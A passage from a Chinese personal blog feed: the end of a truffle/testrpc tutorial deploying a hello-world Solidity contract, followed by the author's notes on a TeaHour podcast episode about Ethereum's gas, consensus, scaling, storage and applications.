&apos;0x083c2e3debbd83e7193d430c95cb65dfac38be2e&apos;,  &apos;0xa268de20bc84f2a371f46e71dd51a437fd0b2b8a&apos;,  &apos;0x6a183c520fac524984ff620f6962e758b0a72d3c&apos;,  &apos;0xe365cc8ef2ab2bc1bc4d6bbda83a8abb589239cc&apos;,  &apos;0x179aa33ae7918af15c956d8b2c8e784004da30e7&apos;,  &apos;0x596a67f06884c15ffe9c8767b698730791d6a80d&apos;,  &apos;0x318bb06f46a24a322a2a0a173712b630a41f8755&apos;,  &apos;0xe1b157fed1cbd523538ed0785bbafef2bb5b5aa5&apos; ]</code></pre><p>回显恰好是分配我们的测试地址</p><p>余额查询</p><pre><code>ruffle(development)&gt; web3.eth.getBalance(web3.eth.accounts[0])BigNumber { s: 1, e: 20, c: [ 1000000 ] }</code></pre><p>(好像js 对大数支持不好???)</p><h1 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h1><p>因为这个版本迭代太快,所以发现网上有些教程,存在各种报错<br>所以算是自己慢慢摸索考证,解决了部分问题</p><pre><code>Q: 运行truffle console 时 报错,说是网络有问题相关    Error: No network specified. Cannot determine current network.A: 修改目录下的truffle.js的内容 用于指定RPC的地址</code></pre><p>​<br>        module.exports = {<br>            networks: {<br>                    development: {<br>                      host: “localhost”,<br>                      port: 8545,<br>                      network_id: “*”<br>                       }<br>            }<br>        };</p><p>至此环境搭建完毕</p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>上面算是搭建好了开发的环境<br>下面开始写一个hello world的智能合约</p><h3 id="什么是智能合约"><a href="#什么是智能合约" class="headerlink" title="什么是智能合约"></a>什么是智能合约</h3><blockquote><p>其实在我的理解上 EVM 以太坊虚拟机,就是我们允许智能合约的平台, 我们使用solidity 编写的合约,然后,经过编译器,将其编译成字节码(op) , (真的神奇), 当部署,和使用合约之后,就会被执行<br>就是一个函数,签订合同的就可以使用(估计错误)</p></blockquote><p>这样援引一段话</p><blockquote><p>智能合约只是一些运行在电脑（或其他节点）的区块链加密货币网络的特定代码，一旦节点执行了这个代码，合约就会更新总账（ledger）。所以如果你们熟悉我的话，我喜欢在一些已经存在的概念上(notion)，做一些类比和抽象上的尝试。实际上这可以构建的知识结构，比如模式(schema)。<br><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8wY2FmMzAzZTFmNGM=" title="https://www.jianshu.com/p/0caf303e1f4c">什么是智能合约<i class="fa fa-external-link"></i></span></p></blockquote><p>这里是部分EOS(基于eth的去中心操作系统的部分合约代码)</p><pre><code>contract DSAuthority {function canCall(    address src, address dst, bytes4 sig    ) constant returns (bool);}contract DSAuthEvents {    event LogSetAuthority (address indexed authority);    event LogSetOwner     (address indexed owner);}</code></pre><p>下面是部分的evm机器码(汇编!!!)</p><pre><code>PUSH1 0x60PUSH1 0x40MSTORECALLDATASIZEISZEROPUSH2 0x011bJUMPI</code></pre><p>这里是的<span class="exturl" data-url="aHR0cHM6Ly9ldGhlcnNjYW4uaW8vYWRkcmVzcy8weDg2ZmEwNDk4NTdlMDIwOWFhN2Q5ZTYxNmY3ZWIzYjNiNzhlY2ZkYjAjY29kZQ==" title="https://etherscan.io/address/0x86fa049857e0209aa7d9e616f7eb3b3b78ecfdb0#code">EOS合约内容<i class="fa fa-external-link"></i></span></p><h3 id="合约部署"><a href="#合约部署" class="headerlink" title="合约部署"></a>合约部署</h3><h4 id="工程模板"><a href="#工程模板" class="headerlink" title="工程模板"></a>工程模板</h4><p>truffle 很方便的给我们提供了,便捷的工程模板的搭建</p><p>建立目录hello 执行</p><pre><code>truffle init</code></pre><p>等待片刻</p><pre><code>Downloading...Unpacking...Setting up...Unbox successful. Sweet!Commands:  Compile:        truffle compile  Migrate:        truffle migrate  Test contracts: truffle test</code></pre><p>以上回显 表示模板建立OK 目录结构</p><pre><code>hello├── contracts│   └── Migrations.sol├── migrations│   └── 1_initial_migration.js├── test├── truffle-config.js└── truffle.js3 directories, 4 files</code></pre><p>模板初始化完毕</p><h4 id="合约编译"><a href="#合约编译" class="headerlink" title="合约编译"></a>合约编译</h4><p>solidity是编写合约的语言,和js相似(奈何没学过),所以从度娘那里抄了一个helloworld</p><pre><code>pragma solidity ^0.4.4;contract hello {    function sayHello() returns (string) {            return (&quot;Hello World&quot;);    }}</code></pre><p>contract {} 说明是合约, 定义函数,说明返回值类型,函数体返回字符串,所以最后应该会显示该字符串(应该吧)</p><p>保存为hello.sol ,保存在contract 目录下<br>(模板本身自带一个合约,可以删除,可以不动,没影响)</p><p>执行 完成编译</p><pre><code>truffle compile Compiling ./contracts/Migrations.sol...Compiling ./contracts/hello.sol...Compilation warnings encountered:/Users/r4y/Misc/tmmp/contracts/hello.sol:4:6: Warning: No visibility specified. Defaulting to &quot;public&quot;.        function sayHello() returns (string) {     ^Spanning multiple lines.,/Users/r4y/Misc/tmmp/contracts/hello.sol:4:6: Warning: Function state mutability can be restricted to pure        function sayHello() returns (string) {     ^Spanning multiple lines.Writing artifacts to ./build/contracts</code></pre><p>警告先忽略, 编译内容在我们的 <strong>build/contract</strong> 下的json文件中</p><h4 id="合约部署-1"><a href="#合约部署-1" class="headerlink" title="合约部署"></a>合约部署</h4><p>修改部署脚本 <strong>igrations/1_initial_migration.js</strong></p><pre><code>ar Migrations = artifacts.require(&quot;./hello.sol&quot;);module.exports = function(deployer) {  deployer.deploy(Migrations);};</code></pre><p><strong>部署合约前先要启动节点</strong><br>执行 以进行合约部署</p><pre><code>truffle migrate    --reset    #出现网络问题,要注意网络部署 见前</code></pre><p>注意 : 当增加或者删除了某个合约后，可以执行“truffle migrate –reset”命令重新部署合约。<br>终端回显</p><pre><code>Running migration: 1_initial_migration.js  Deploying hello...  ... 0xf4f68259d28b84c26ce9bdfb5b246c40441f2733b7810d555fbcdeda24249b6e  hello: 0x84c33260f8085d2b236184734072755cd661dcebSaving artifacts...</code></pre><p>同时 节点终端dbg<br>    有我们的TX gas</p><pre><code>Transaction: 0xf4f68259d28b84c26ce9bdfb5b246c40441f2733b7810d555fbcdeda24249b6eContract created: 0x84c33260f8085d2b236184734072755cd661dcebGas usage: 142468Block Number: 1Block Time: Thu Jan 25 2118 xx:xx:21 GMT+0x00 (CST)</code></pre><p>合约部署完毕 </p><h4 id="合约执行"><a href="#合约执行" class="headerlink" title="合约执行"></a>合约执行</h4><pre><code>truffle consloe     #进入rpc 命令行ruffle(development)&gt; var contractundefinedtruffle(development)&gt; hello.deployed().then(instance =&gt; contract = instance)......truffle(development)&gt; contract.sayHello.call()&apos;Hello World&apos;</code></pre><p>至此HELLOworld 总算是hel出来了</p><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><p><span class="exturl" data-url="aHR0cDovLzhidGMuY29tL3RocmVhZC0yMzE5NS0xLTEuaHRtbA==" title="http://8btc.com/thread-23195-1-1.html">Q&amp;A<i class="fa fa-external-link"></i></span></p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/02/09/ETH%20%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%20helloworld/#disqus_thread</comments>
    </item>
    
    <item>
      <title>TeaHour_ETH笔记</title>
      <link>https://www.diglp.xyz/2018/02/05/teatime%E8%AF%AD%E5%BD%95/</link>
      <guid>https://www.diglp.xyz/2018/02/05/teatime%E8%AF%AD%E5%BD%95/</guid>
      <pubDate>Sun, 04 Feb 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;p&gt;听了Terry Tai 和 Jan Xie 两位大神的 &lt;a href=&quot;teahour.fm&quot;&gt;TeaHour&lt;/a&gt; 电台里谈到ethereum, 受益良多.&lt;br&gt;这篇文章算是自己的笔记, 边听边记吧. 再自行整理的
          
        
      
      </description>
      
      <content:encoded><![CDATA[<p>听了Terry Tai 和 Jan Xie 两位大神的 <a href="teahour.fm">TeaHour</a> 电台里谈到ethereum, 受益良多.<br>这篇文章算是自己的笔记, 边听边记吧. 再自行整理的 :-)</p><p>下面把内容的链接放出来</p><p><span class="exturl" data-url="aHR0cDovL3RlYWhvdXIuZm0vMjAxNi8wMS8xOS90YWxrLXdpdGgtamFuLWFib3V0LWVodGVyZXVtLmh0bWw=" title="http://teahour.fm/2016/01/19/talk-with-jan-about-ehtereum.html">这次我们聊聊超酷的Ethereum<i class="fa fa-external-link"></i></span></p><p>语录:</p><blockquote><p>ruby - 参差多态才是幸福的本源</p><p>有屠龙刀, 没有龙</p><p>大神做的事情,不一定适合众生</p></blockquote><h2 id="区块链杂谈"><a href="#区块链杂谈" class="headerlink" title="区块链杂谈"></a>区块链杂谈</h2><p>自从比特币掀起了区块链的浪潮, 也得益于其代码的开源性质, 所以各种各样的币也就横空出世, 比如</p><ul><li>优化加密算法(scrypt)和出块速度的 LTC</li><li>主打加密匿踪的 ZEC</li><li>社区支持的DASH</li><li>etc….</li></ul><p>这一类基于比特币思想, 再加上特定的其他特性(feature)的币 , 就统统称为Copycat coin (山寨币)<br>但是, 实际上这些种类的数字货币是不具有图灵完备.<br>以上就是我们的区块链1.0时代</p><h2 id="现在的Ethereum"><a href="#现在的Ethereum" class="headerlink" title="现在的Ethereum"></a>现在的Ethereum</h2><h3 id="Ethereum的横空出世"><a href="#Ethereum的横空出世" class="headerlink" title="Ethereum的横空出世"></a>Ethereum的横空出世</h3><p>以太坊是 <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvVml0YWxpa19CdXRlcmlu" title="https://en.wikipedia.org/wiki/Vitalik_Buterin"><code>Vitalik</code><i class="fa fa-external-link"></i></span> (当时才18岁, 天才骚年!) 提出, 并设计架构的一个区块链系统, 这个系统具有准图灵完备性(最近才支持循环).</p><p>这个项目也是个众筹项目, 众筹当时是众筹了30K个BTC, 折合成当时的币价的话大约 有一千八百万刀, 也正是这个项目的亮眼之处吸引了众多的投资者, 因为它力在搭建一个 platform 而不是基于BTC进行fork的另外的一种币而已. </p><p><img src="https://t10.baidu.com/it/u=1423318392,3346721005&amp;fm=173&amp;s=0A83834D5C269B1F8A84FCFF03005023&amp;w=320&amp;h=223&amp;img.JPEG" alt="Vitalik Buterin"></p><blockquote><p>Vitalik 其人, 据说是一周读两本书的, 主要是使用python进行开发, 可是这样的一个大神据说搞不定装 ARCH </p></blockquote><p>BTC 的是采用的CPP进行的开发. ETH则是采用了go/python/C++ , 这三种语言开发了三个独立可用的节点应用(Jan吐槽:有钱..), 不过现在CPP的项目组已经退出了以太坊基金会了, 转而进行基于ETH的私链开发咨询.</p><p>ETH之所以选择了go,由于其强大的网络功能和与生俱来的并行特性</p><h3 id="GAS的作用"><a href="#GAS的作用" class="headerlink" title="GAS的作用"></a>GAS的作用</h3><p>ETH的网络上存在着GAS这一东西, 顾名思义是汽油, 也就是在以太坊网络上计算所需要消耗的东西</p><h4 id="停机定理-halting-problem"><a href="#停机定理-halting-problem" class="headerlink" title="停机定理(halting problem)"></a>停机定理(halting problem)</h4><blockquote><p>证明一个程序能不能终止, 是不可能的 – Turing<br>停机问题 是个逻辑学和数学的问题, </p></blockquote><p>参考文章:</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzIwMDgxMzU5" title="https://www.zhihu.com/question/20081359">如何通俗地解释停机问题<i class="fa fa-external-link"></i></span></p></blockquote><p>所以在以太坊这个平台上,为了防止恶意行为阻塞网络, 比如一个死循环. </p><blockquote><p>工程师和科学家的思想就从现在体现出来了, 防止网络堵塞问题,如果数学上, 只能去解决这个停机问题. 但是工程上呢, 机智的添加了gas这个东西. </p></blockquote><p>GAS 和以太币是两个东西, 以太币和gas有一个汇率.</p><p>为了使得计算的成本不随着币价波动,GAS作为中介把运行成本和以太币价格解耦 ,( 保证计算消耗和法币是对等的), 最后也是被矿工收走.</p><p>所以这样, 随着计算的进行, gas被消耗掉, 如果程序过于复杂, 或者是死循环, 那么就会抛出一个 OUT of GAS的异常, 并且回滚所有的数据改变</p><p>很机智的绕过了停机问题, 精妙!</p><h3 id="Solidity-语言"><a href="#Solidity-语言" class="headerlink" title="Solidity 语言"></a>Solidity 语言</h3><p>Solidity 是一种类似于 JavaScript的语言 , 虽说语法想像, 可是写起来的感觉是完全不像的.</p><p>现在问题还是有待解决的, 比如: 返回值难得到, 返回变长数组, 循环支持(现在已经有了)</p><p>所以实际上Solidity的vers 只是算得上 零点几吧, 算得上是一个alpha (现在可能是beta了吧) </p><h3 id="分布式数据库"><a href="#分布式数据库" class="headerlink" title="分布式数据库"></a>分布式数据库</h3><p>如果一个区块链应用, 从架构上可以直接把数据库替换成区块链, 理论上理解就是这么简单</p><p>可以直接使用 client 对区块链进行操作.</p><p>比如这里有个论坛, 论坛使用 js 来进行区块链的读写, 当我们跑起自己的节点的时候相当于每人都有自己的一个网站</p><p>正如 sql 和数据库沟通, json rpc 可以控制节点</p><h4 id="异步问题"><a href="#异步问题" class="headerlink" title="异步问题."></a>异步问题.</h4><p>由于区块链的POW的共识机制, 现在如果我要把<code>a = 1</code>, 可是必须要等到矿工挖到块之后, 才会计算(给a赋值), 还需要一定的时间广播到全网, 过程是十分的异步</p><h3 id="EVM的计算"><a href="#EVM的计算" class="headerlink" title="EVM的计算"></a>EVM的计算</h3><p>####计算过程</p><p>使用Solidity 写一个合约, 相当于一个 class , 可以调用 json rpc , 编译成opcode, 在evm 上运行…</p><h4 id="出块时间"><a href="#出块时间" class="headerlink" title="出块时间"></a>出块时间</h4><ul><li><p>BTC时间</p><p>  在BTC的网络是 10分钟出块, 60分钟 6 次确认. 所以我们一次交易得到处理的时间是十分钟, 完全放心就是一个小时了. 所以这个是还是相当久的</p></li><li><p>ETH时间</p><p>  在以太坊上的话, 是有所提速的,由于在网络传播的速度是有限的, 所以对共识的时间有很大的影响. </p><p>  如果高峰时间, 会出现了分叉, (同时挖出). eth 出块时间短了, 导致了分叉的很多, 出块的时间, 基本是15S 出块(单机测试是5S),这样的分叉出块, 被称为uncle(叔块)</p></li></ul><p>参考文章:</p><blockquote><p><span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc3VwZXJzd29yZHMvYXJ0aWNsZS9kZXRhaWxzLzc2NDQ1Mjc4" title="http://blog.csdn.net/superswords/article/details/76445278">以太坊中的叔块(Uncle Block)<i class="fa fa-external-link"></i></span></p></blockquote><h2 id="ETH目前面临的问题"><a href="#ETH目前面临的问题" class="headerlink" title="ETH目前面临的问题"></a>ETH目前面临的问题</h2><h3 id="共识机制"><a href="#共识机制" class="headerlink" title="共识机制"></a>共识机制</h3><p>dapp都是运行在EVM虚拟机上的, <code>使用pow</code> , 虽然确认时间缩短 , 可是还是需要几分钟才能得到若干个确认,因为在POW的机制下的电脑一起做运算, 采取谁解出了这个块, 那么就采用谁的, 其他的全部从新开始, 其实这样就是单台电脑的计算能力了,</p><blockquote><p>ETH之前决定使用Pos 可是实现过程受阻(deadline),为了尽快的实现这个plafrom ,所以先使用pow</p><p>ETH基金会承诺以后后会实现PoS的共识机制, 所以这点也很有意思的导致了eth 是没有矿机的, 因为害怕Pos转型, 这样矿机就一文不值了呀 </p></blockquote><h4 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h4><ul><li><p>新的共识机制</p><p>  以太坊 最后会实现Casper 作为新的共识协议, 其中有验证人节点, 交了押金作为一个可信对象, 如果说交易验证通过(是正确的块)的话, 使用自己的私钥对这个区块进行签名, 之后在全网得到共识, 这样是可以实现秒级的确认.</p></li><li><p>网络分片(shard)</p><p>  defcon 上 的方法, 就是对eth的网络, 进行网络分片.不同的合约类型, 放在不同的网络片上,虽然说挖矿这种方式是为了实现一种网络信任, 不过还是有一定的优化空间, 动态网络分片 2^16 个shard(分片)</p></li></ul><h3 id="隐私问题"><a href="#隐私问题" class="headerlink" title="隐私问题"></a>隐私问题</h3><p>由于当前区块链技术网络上所有的数据都是透明的, 每个区块数据,都是可见的. 所以隐私问题是值得关注的一点</p><h4 id="方案-1"><a href="#方案-1" class="headerlink" title="方案"></a>方案</h4><p>采用同态加密技术<br>引用百科对于同态加密的定义</p><blockquote><p>对经过同态加密的数据进行处理得到一个输出，将这一输出进行解密，其结果与用同一方法处理未加密的原始数据得到的输出结果是一样的。</p></blockquote><p>参考文章:</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI3NjQ1ODU4" title="https://www.zhihu.com/question/27645858">同态加密的实现原理<i class="fa fa-external-link"></i></span></p></blockquote><h3 id="伸缩性问题"><a href="#伸缩性问题" class="headerlink" title="伸缩性问题"></a>伸缩性问题</h3><p>早期的比特币是没有区块容量限制的, (一个区块就是十分钟里的所有链上数据的打包), 这样导致了一个交易被恶意的加入了大量的无用数据, 这样会白白牺牲节点的硬盘空间.  所以后面中本聪(Satoshi Nakamoto), 加入了1MB的区块大小限制, 并且也制订了后面的增长.</p><p>这1MB的区块容量也决定了, 区块的最大交易处理速度. 关联过程如下:</p><pre><code>TPS = BlockSize / TxSize / (10 * 60)</code></pre><p>一般的一次转账交易的数据大小是250B左右(BTC), 这样得到最后结果 <code>TPS =  6Tx/s</code></p><p>所有由此见到区块小了, 网络速度就下降. 可是如果区块足够大, 又存在着节点空间的问题, 间接导致了比特币的中心化. 历史上关于比特币的扩容问题, 十分的激烈, 隔离见证, 闪电网络.</p><p>由于共识机制的存在 , 算力份额相当于手上的票一样 , 就是在矿工手上, 更明确的说, 是在矿池 , 和矿老板的手上 , 可是他们的目光只是保证自己的收入稳定, 这些观点往往和开发者是冲突的. 所以引起了扩容战争. </p><p>还有一件引人注意的事情, </p><blockquote><p>比特币核心开发者Mike Hearn发表文章称比特币实验失败了，指出它被中国控制了，他宣布退出比特币项目，卖掉所有的币。Mike Hearn说，他很早就告诫其他人，比特币是一个实验，和所有实验一样，都可能会失败，如果不能承担损失不要去投资。但得出比特币已经失败的结论时，他仍然很伤感。比特币的基础已经破坏，不管短期的价格如何变化，它的长期趋势将是下滑。</p><p>以下来自博客翻译：<br>为什么比特币失败了？因为社区垮掉了。这个所谓的去中心化数字货币系统被少数人掌控，更糟糕的是，整个网络正处于技术崩溃的边缘。比特币不再好于现有的商业支付系统，它的手续费甚至超过了信用卡的交易费。他说，最根本的原因是中国的矿工控制了比特币，仅仅两个矿池的算力就超过整个比特币网络的50%。超过95%的算力控制在上面这幅图中的人手中。这些矿工不再允许块链增长。他们拒绝对比特币软件进行必要的修改，他们担心如果比特币太流行的话会被防火长城盯上，屏蔽掉比特币网络，导致他们失去收入。为了改进交易速度，增加区块大小，比特币社区去年就创建新分支举行投票，投票的方式是运行名为比特币XT的挖矿软件。比特币XT与现在的比特币核心挖矿软件没有区别，但是当有75%的节点运行XT，分支将会正式创建。但比特币XT引发了控制者们的强烈反对，比特币最大论坛<span class="exturl" data-url="aHR0cDovL2JpdGNvaW4ub3Jn55qE566h55CG5ZGY5Lul57y65LmP5rCR5Li75Li655Sx5bCB5p2A5LqG5q+U54m55biBWFTnmoTorqjorrrjgILmm7TmgbbliqPnmoTmmK/vvIzlvZPmr5TnibnluIFYVOiKgueCueWNoOWIsOaAu+iKgueCueeahDE1JeaXtu+8jFhU55So5oi36YGt5Yiw5LqG5aSn6KeE5qihRERvU+aUu+WHu++8jOWkp+WIsOi2s+S7peeYq+eXquefv+W3peaJgOWcqElTUOeahOaVtOS4que9kee7nOOAgui/meS4gOS/oeaBr+W+iOaYjuehru+8jOS7u+S9leaUr+aMgeWkp+WMuuWdl+eahOS6uumDveS8mumBreWIsOaUu+WHu+OAguaUu+WHu+i/mOWcqOe7p+e7re+8jOWIm+S4muWFrOWPuENvaW5iYXNl5a6j5biD5pSv5oyBWFTml7bku5bku6zooqvmlLvlh7vogIzkuIvnur/kuobkuIDmrrXml7bpl7TjgILku5blo7Dnp7DvvIzmr5TnibnluIHoiKrooYzliLDkuobkuIDkuKrmnoHnq6/ljbHpmannmoTmsLTln5/vvIzkuI4=" title="http://bitcoin.org的管理员以缺乏民主为由封杀了比特币XT的讨论。更恶劣的是，当比特币XT节点占到总节点的15%时，XT用户遭到了大规模DDoS攻击，大到足以瘫痪矿工所在ISP的整个网络。这一信息很明确，任何支持大区块的人都会遭到攻击。攻击还在继续，创业公司Coinbase宣布支持XT时他们被攻击而下线了一段时间。他声称，比特币航行到了一个极端危险的水域，与">http://bitcoin.org的管理员以缺乏民主为由封杀了比特币XT的讨论。更恶劣的是，当比特币XT节点占到总节点的15%时，XT用户遭到了大规模DDoS攻击，大到足以瘫痪矿工所在ISP的整个网络。这一信息很明确，任何支持大区块的人都会遭到攻击。攻击还在继续，创业公司Coinbase宣布支持XT时他们被攻击而下线了一段时间。他声称，比特币航行到了一个极端危险的水域，与<i class="fa fa-external-link"></i></span> Mt Gox破产危机不同，这一次的危机发生在核心系统。他最后祝所有的人好运</p></blockquote><p>参考文章:</p><blockquote><p><span class="exturl" data-url="aHR0cDovL3d3dy5qcG0uY24vYXJ0aWNsZS0yOTIyNC0xLmh0bWw=" title="http://www.jpm.cn/article-29224-1.html">比特币扩容之战<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cDovL3d3dy5qcG0uY24vYXJ0aWNsZS0yOTIyNC0xLmh0bWw=" title="http://www.jpm.cn/article-29224-1.html">为什么比特币硬分叉不会分裂成两个币<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM5NTIzODIxL2Fuc3dlci84MTgyNDMwNw==" title="https://www.zhihu.com/question/39523821/answer/81824307">比特币实验失败了?<i class="fa fa-external-link"></i></span></p></blockquote><h3 id="存储问题"><a href="#存储问题" class="headerlink" title="存储问题"></a>存储问题</h3><p>区块链在现在的阶段, 智能存储小量数据, 如果打算在上面存一部电影,当前还是无法实现的. 所以现在的发展趋势之一就是添加区块链的存储层的解决方案</p><p>在当前的众多区块链项目中, 不乏分布式存储的项目, 如下有:</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9pcGZzLmlv" title="https://ipfs.io">IPFS<i class="fa fa-external-link"></i></span> (没有经济激励)<br>   Swarm    (添加了IPFS的经济激励)</li><li><span class="exturl" data-url="aHR0cHM6Ly9zaWEudGVjaA==" title="https://sia.tech">Sia<i class="fa fa-external-link"></i></span> </li><li><span class="exturl" data-url="aHR0cHM6Ly9zdG9yai5pbw==" title="https://storj.io">storJ<i class="fa fa-external-link"></i></span></li></ul><p>上面这几项, 经过几年的发展基本上是可以用的程度了</p><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>过度依赖于经济激励, 而不是算法上解决的, 经济激励不是最logic的方式. 但是呢, 这些项目又是不具有图灵完整的,所以与ETH整合才是王道</p><p>理应使用算法优先吧 2333</p><h2 id="以太坊的部分Q-amp-A"><a href="#以太坊的部分Q-amp-A" class="headerlink" title="以太坊的部分Q&amp;A"></a>以太坊的部分Q&amp;A</h2><h3 id="公链和私链的区别"><a href="#公链和私链的区别" class="headerlink" title="公链和私链的区别"></a>公链和私链的区别</h3><p>Public chain 和 private chain, 主要的区别在于 <strong>参与共识过程的人是否有准入门槛</strong><br>联盟链, 多个地方一起跑起进行一个区块链的维护. 联盟链的应用, 很好的适用于银行, 这样数据库公有, 特别是跨行转账<br>联盟链特定用于解决了 : 审计方面的痛点, 事实上金融业早都在研究区块链了!</p><h3 id="自己搭建btc-eth的私链"><a href="#自己搭建btc-eth的私链" class="headerlink" title="自己搭建btc/eth的私链"></a>自己搭建btc/eth的私链</h3><p>由于Pow的共识机制, 主要用于解决公网上的共识问题,拜占庭将军问题. 避免网络上出现了大量的恶意节点对网络发起了攻击(女妖攻击) ,</p><p>如果现在我们到了私有网络, 就没有必要使用POW机制了, 否则这个机制就是解决了一个本来就不存在的问题. 所以可以把共识机制, 改为其他的拜占庭容错. 这样也可以得到更快的出块速度</p><h3 id="这些项目到底是什么"><a href="#这些项目到底是什么" class="headerlink" title="这些项目到底是什么?"></a>这些项目到底是什么?</h3><p>区块链 可以被认为是一个可信数据库, 以太坊是基于区块链技术的EVM 实现了可信计算<br>94年互联网,就是现在的区块链!!!</p><p>区块链只是使用P2P下载账本? 其实不然, 不然,忽略了很多东西, </p><p>借助微博上的一句话：</p><blockquote><p>你们知道比特币、以太坊、亦来云的区别吗？</p><ul><li>比特币=可信记账；</li><li>以太坊=可信记账+可信计算；</li><li>亦来云=可信记账+可信计算+可信应用环境；</li></ul><p>很多人认为区块链的项目还是国外的靠谱，其实中国在区块链方面已走在世界的前列，比如亦来云就是最典型的例子。</p></blockquote><p>这里也算是自己了解到了亦来云这个项目 , 这个说实话 需要好好关注一下. </p><p>与其类似的还有一个叫做基石的国外项目,(国人在币交易市场上叱咤, 导致现在这个项目是需要KYC(know your customer)了, 结果现在国人连公募资格都批不了了!!!ƒk), 这个项目几个小时就筹齐了!!</p><p>项目地址:</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYXJjYmxvY2suaW8=" title="https://www.arcblock.io">基石项目<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZWxhc3Rvcy5vcmc=" title="https://www.elastos.org">亦来云项目<i class="fa fa-external-link"></i></span></p></blockquote><h3 id="区块链和分布式数据库的区别"><a href="#区块链和分布式数据库的区别" class="headerlink" title="区块链和分布式数据库的区别"></a>区块链和分布式数据库的区别</h3><p>传统的分布式数据库, 如何可以并行的写?</p><p>由交易方发起交易请求,BC 可以做到选择交易和交易排序, 这样就在节点可以解决数据冲突,和消除错误虚假数据.<br>这样就不是, 由用户直接操作数据, 重要的达到可信.</p><p>这样想, 分布式的数据库, 有数据库本体, 和用户, 这两部分, 用户写入, 数据库存储.但是区块链, 更是一个体系! 用户发送交易请求, 开发负责网络的应用部署, 矿工来实现计算和合法性校验</p><h2 id="ETH的未来展望"><a href="#ETH的未来展望" class="headerlink" title="ETH的未来展望"></a>ETH的未来展望</h2><h3 id="设想"><a href="#设想" class="headerlink" title="设想"></a>设想</h3><p>目前有三个层面的设想, 金融, 存储, 和物联网</p><p>电子证据保全, 使用区块链的存储功能. 基于区块链交易所, 保证交易过程的完全可信</p><p><strong>(三全分立! , 用户交易, 你的程序, 在节点执行)</strong></p><p>由于现在的区块链的储存能力, 计算能力还不强.所以, 这两个方面还是有很长的路要走, 但是现在的功能已经和金融有了很好的适用, 金融的本身就是小数字和计算</p><h4 id="金融"><a href="#金融" class="headerlink" title="金融:"></a>金融:</h4><p>使用去中心化的思想实现一个稳定的货币,<br>差价合约, A和B都在一个合约里面放1K个ETH, (假定当前币价是10) 一个月后拿出, A就得到10K等价的ETH(以现在的法币价), B得到剩下的那一部分, 所以这样A 得到了一个价格稳定的币价保证.这合约很好解决.<br>但是问题是, 我的智能合约在EVM中运行, 和外界的数据是没有联系的, 也就没办法得到当前的币价, 所以需要一个角色来输入ETH的当前的币价, 但是这样就无法保证这个角色的可信.</p><p>Vitalik 就提出了一个概念, </p><p>在博弈里面 (common knowledge)公有知识是很重要的, </p><blockquote><p>两个人去纽约, 没有对方的信息,而要会面,怎么办?? 很大的可能,大家会在自由女神像会面,这个就是体现了(common knowledge)公有知识的力量</p></blockquote><p>你是这样想,你相信想另一个人会这样想, 你相信另外一个人会相信你会这么想,无穷的递归</p><p>这个其实也是POW 的博弈原理, POW的挖矿</p><p>如何使用公有知识, 实现可信的链外输入. </p><p>博弈原理: 例子: 如果有 1000 个人, 每个人写下币价, 如果在25%-75% 范围以外的人, 会有惩罚, 人们互相是不知道别人的价格, 所以最后,会靠近最正确的,(这就是common knowledge), 也就是囚徒问题的变种. </p><h4 id="物联网应用"><a href="#物联网应用" class="headerlink" title="物联网应用"></a>物联网应用</h4><p>区块链在物联网方向是有很美好前景的, 之前就有过 IBM和Sumsung 的合作, 曾经使用基于以太坊的demo, (Adept)<br><span class="exturl" data-url="aHR0cDovL3d3dy44YnRjLmNvbS9pYm0tYWRlcHQ=" title="http://www.8btc.com/ibm-adept">Adept项目地址<i class="fa fa-external-link"></i></span></p><p>因为区块链上很自然的有价值和所有权的转移, 所有可以很好的保证物品之间的经济行为. 使用区块链登记物品所有权换转移, 比如出租.  </p><p>有个项目, Slock是基于以太坊的行为, 把物联网,共享经济和区块链相结合起来, 就是把物联网抽象为一把锁(真实世界的锁), 锁的所有权可以在区块链上面进行转移. 这样就可以通过合约实现一个 临时的所有权转让,<br><span class="exturl" data-url="aHR0cHM6Ly9zbG9jay5pdA==" title="https://slock.it">Slock项目地址<i class="fa fa-external-link"></i></span></p><p>现在已经有物联网的锁了, 但是这样通过中心化的第三方, 这样就不能确认是不作恶的. 所有如果放在区块链上就得到了很好的信任解决</p><p>很多人并不介意 中心化的架构, 区块链的引用不能破坏 当前的中心化体验</p><p>现在比如基于BC的物理 和 产品溯源</p><h2 id="有趣的应用"><a href="#有趣的应用" class="headerlink" title="有趣的应用"></a>有趣的应用</h2><h3 id="庞氏骗局网站"><a href="#庞氏骗局网站" class="headerlink" title="庞氏骗局网站"></a>庞氏骗局网站</h3><p>这个就厉害了, 项目名就是庞氏骗局, 而且就是一个庞氏骗局…明文写着, 把后面人的钱分给前面加入的人, 很多人参入的!<br>其实我想通了一个事情, 传销的人知道这是传销, 但是总是幻想自己不是那个最底层的韭菜, 大家其实知道这是传销, 无所谓~</p><h3 id="百万格子"><a href="#百万格子" class="headerlink" title="百万格子"></a>百万格子</h3><p>传奇项目<span class="exturl" data-url="aHR0cDovL3d3dy5taWxsaW9uZG9sbGFyaG9tZXBhZ2UuY29t" 